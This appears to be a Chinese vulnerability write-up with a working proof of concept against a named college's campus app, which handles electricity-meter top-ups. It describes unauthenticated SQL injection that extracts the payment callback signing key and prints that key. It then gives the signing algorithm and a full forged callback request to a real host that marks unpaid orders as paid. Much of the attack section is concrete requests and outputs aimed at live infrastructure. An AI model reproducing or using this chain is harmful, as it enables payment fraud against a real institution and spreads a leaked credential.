## 吉利学院”吉利相伴APP““电表充值”业务功能服务端存在支付链路伪造漏洞

**==(漏洞原理与“智能水控”业务功能服务端存在支付链路伪造漏洞逻辑相同)==**

### 漏洞原理

![](Pasted%20image%2020260917165927.png)

三处缺陷叠加构成完整攻击链：

1. `Apidk/make_order` 无任何鉴权，`account`/`amount` 完全由客户端指定，可为任意学号创建任意金额订单；
    
2. `Apidk/get_bind_one` 的 `account` 参数直接拼接进 SQL（无需登录），extractvalue 报错注入可读取库内任意数据，包括回调验签密钥 `PayDKKey`（存放在同一 `dianka` 库 `e_config` 表 id=17 行）与商户渠道号 `PayDKPch`（id=16 行）；
    
3. `Apidk/callback` 不校验来源 IP、验签密钥可被注出——拿到密钥即可离线计算合法签名，伪造"支付成功"通知使任意未支付订单直接到账


此外 APP 开启 ThinkPHP 调试模式（app_debug=true）：给 callback 提交缺字段的 data 即可让调试页**直接回显 Apidk.php 源码**（168-198 行），验签算法、密钥行号、orderstate 判断逻辑原样可见，无需猜测


### 信息收集

创建电费支付订单抓包时发现相应的请求路径与`payurl`：

![](Pasted%20image%2020260915200508.png)





与“智能水控”业务漏洞一样，访问url，拿订单号，`e_logs`数据表中的指定人员的`orderdate`字段的表单创建时间值和`orderno`字段的表单值，以及使用**密钥 + 相应签名算法**进行计算`SIGN`签名值

通过SQL注入获取电费支付`keyName`对应的`keyValue`的值：

![](Pasted%20image%2020260914165609.png)


![](Pasted%20image%2020260914165706.png)


![](Pasted%20image%2020260914220720.png)

`4FaSoZvtCIkVETQwvnVnGEhXxDsK8z61




### 构造Poc


泄露的算法离线计算签名：对 data、op、requesttime、version、xmpch 五个参数按 ksort 拼接为 k=v& 串，拼接 PayDKKey 后取 MD5 大写。data 为订单回执 JSON（orderno 填自己的未支付订单号，jylsh 使用全新流水号避免幂等去重）的 base64，body 中 data 的等号需编码为 %3D。向 /index.php/apidk/callback 发送如下请求（订单 E2609151850199943，10 元）


响应为 HTTP 500 调试页，其中回显：

```
SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~PayDKKey:4FaSoZvtCIkVETQwvnVnGE'
```


![](Pasted%20image%2020260917170732.png)


![](Pasted%20image%2020260917170753.png)



![](Pasted%20image%2020260917170430.png)



![](Pasted%20image%2020260917170523.png)


![](Pasted%20image%2020260917170840.png)



构造POST请求包信息：

![](Pasted%20image%2020260915200852.png)



PoC例:
```
POST /index.php/apidk/callback HTTP/1.1  
Host: sqdkapp.guc.edu.cn  
Content-Type: application/x-www-form-urlencoded  
  
op=Notify&xmpch=144-2025090005&version=1.4&data=eyJ4bXBjaCI6IjE0NC0yMDI1MDkwMDA1Iiwib3JkZXJkYXRlIjoiMjAyNjA5MTUxODUxMjQiLCJvcmRlcm5vIjoiRTI2MDkxNTE4NTAxOTk5NDMiLCJhbW91bnQiOjEwLjAwLCJqeWxzaCI6IjI2MDkxNTAwMDgwMSIsInBheW1ldGhvZCI6IldYX1JDIiwib3JkZXJzdGF0ZSI6IjEiLCJyZXR1cm5fdHlwZSI6IjIiLCJwYXllcmlkIjoiMjQxMTIzMTEwNDQ3IiwicGF5ZXJuYW1lIjoi6YKT54WM5bG%2FIiwicmVtYXJrMSI6IiIsInJlbWFyazIiOiIifQ%3D%3D&requesttime=20260915185124&sign=751CEFCBC9DC2458A47DBF5BD157207B

结果: 服务端返回 200 空响应（与正常回调一致），订单被置为已支付并向电表入账。
```









验证入账

发送后查看APP中的钱包金额是否发生变化，变化则充值成功


- 再次调用 `Apidk/get_bind_one`，`balance` 应恰好增加订单金额（如 35.60 → 45.60）；
    
- APP 重新进入"宿舍用电"页面可见新余额，"充值记录"里该订单显示**"充值成功"**；
    
- 数据库侧（SQL注入辅助）`e_order_dk` 中该订单 `status` 由 2 变 1、`jylsh`/`saleNo`/`notify_time` 落库

![519](Pasted%20image%2020260915201009.png)


































































































